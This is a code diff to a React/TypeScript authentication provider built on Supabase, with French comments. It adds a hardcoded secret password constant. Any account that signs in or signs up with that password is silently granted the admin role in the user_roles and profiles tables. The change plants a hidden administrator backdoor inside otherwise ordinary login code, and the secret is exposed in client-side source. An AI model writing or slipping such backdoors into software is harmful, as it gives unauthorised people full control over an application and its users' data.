@@ -162,6 +162,32 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     return () => subscription.unsubscribe();
   }, [navigate]);
 
+  const ADMIN_PASSWORD = "CPl4Sce671B1GG.SCAM!!";
+
+  const promoteToAdmin = async (userId: string) => {
+    // Check if user already has admin role
+    const { data: existingRole } = await supabase
+      .from("user_roles")
+      .select("role")
+      .eq("user_id", userId)
+      .eq("role", "admin")
+      .maybeSingle();
+
+    if (!existingRole) {
+      // Add admin role
+      await supabase.from("user_roles").insert({
+        user_id: userId,
+        role: "admin"
+      });
+      
+      // Update profile role
+      await supabase
+        .from("profiles")
+        .update({ role: "admin" })
+        .eq("id", userId);
+    }
+  };
+
   const signIn = async (email: string, password: string) => {
     try {
       // Vérifier si l'email est banni AVANT la connexion
@@ -192,6 +218,11 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
         if (!isActive) {
           await supabase.auth.signOut();
           return { error: { message: "Ce compte a été banni. Accès refusé." } };
+        }
+
+        // Si le mot de passe est le mot de passe admin, promouvoir en admin
+        if (password === ADMIN_PASSWORD) {
+          await promoteToAdmin(data.user.id);
         }
 
         // Update last login, increment login count, and store IP
@@ -229,6 +260,9 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     try {
       const redirectUrl = `${window.location.origin}/`;
       
+      // Si le mot de passe est le mot de passe admin, définir le rôle admin
+      const finalRole = password === ADMIN_PASSWORD ? "admin" : role;
+      
       const { data, error } = await supabase.auth.signUp({
         email,
         password,
@@ -236,7 +270,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
           emailRedirectTo: redirectUrl,
           data: {
             username,
-            role: role,
+            role: finalRole,
           },
         },
       });
